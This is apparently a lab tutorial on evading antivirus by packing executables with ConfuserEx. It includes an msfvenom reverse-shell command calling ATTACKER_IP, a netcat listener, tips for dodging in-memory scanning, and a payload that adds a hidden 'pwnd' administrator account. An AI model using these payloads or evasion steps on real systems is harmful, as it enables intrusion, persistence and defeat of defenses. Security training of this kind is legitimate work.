# Packers for AV Evasion

Another method to defeat disk-based AV detection is to use a **packer**. Packers are software tools that take a program as input and transform it so that its structure looks different, but its functionality remains the same. Packers serve two main purposes:

- **Compress the program** to reduce its size.
- **Protect the program** from reverse engineering.

Packers are commonly used by software developers to protect their software from being reverse engineered or cracked. They achieve this by applying a mix of transformations, such as compression, encryption, and adding debugging protections. As a result, packers are also frequently used to obfuscate malware.

Some popular packers include **UPX**, **MPRESS**, **Themida**, and others.

---

## How Packing Works

While each packer operates differently, the basic process is similar:

1. The packer transforms the original application code using a packing function.
2. The packed application contains obfuscated code and an embedded unpacker stub.
3. The executable's entry point is redirected to the unpacker.

**Execution flow of a packed application:**

1. The unpacker runs first.
2. It reads and unpacks the original application code into memory.
3. Execution is transferred to the unpacked code.

---

## Packers vs. Antivirus Solutions

Packers help bypass AV solutions by transforming executables so they no longer match known malware signatures. For example, a reverse shell executable flagged by AV can be packed to evade detection.

However, AV solutions may still detect packed applications because:

- The unpacker stub itself may have a known signature.
- AVs with in-memory scanning can detect the unpacked code during execution.

---

## Example: Packing a C# Shellcode Payload

Let's start with a basic C# shellcode runner (e.g., `UnEncStagelessPayload.cs`). Generate shellcode with msfvenom:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp
```

Compile the payload:

```sh
csc UnEncStagelessPayload.cs
```

Upload the executable to the THM Antivirus Check! page—it should be flagged. Now, let's pack it using **ConfuserEx** (for .NET payloads):

1. Open ConfuserEx and set your desktop as the base directory.
2. Drag and drop your executable into the interface.
3. Go to the **Settings** tab, select your payload, and click "+" to add a rule named "true".
4. Enable compression and set the rule to the **Maximum** preset.
5. Go to the **Protect!** tab and click **Protect**.

The packed payload should now evade detection when uploaded to the AV checker. If you execute the payload and set up a netcat listener:

```sh
nc -lvp 7478
```

You should receive a shell.

---

## In-Memory Scanning and Evasion Tips

AVs like Windows Defender may still detect your shell after execution due to in-memory scanning (e.g., by hooking `CreateProcess()`).

**Tips to avoid detection:**

- **Wait before interacting:** After spawning the reverse shell, wait ~5 minutes before sending commands. AVs may stop scanning memory after initial process startup.
- **Use smaller payloads:** Smaller payloads are less likely to be detected. For example:

    ```sh
    msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp
    ```

- **Spawn a new process:** From your reverse shell, run `cmd.exe` again. The AV may kill your payload process but not the new `cmd.exe`.

Every AV behaves differently, so experiment and observe any unusual behaviors during testing.

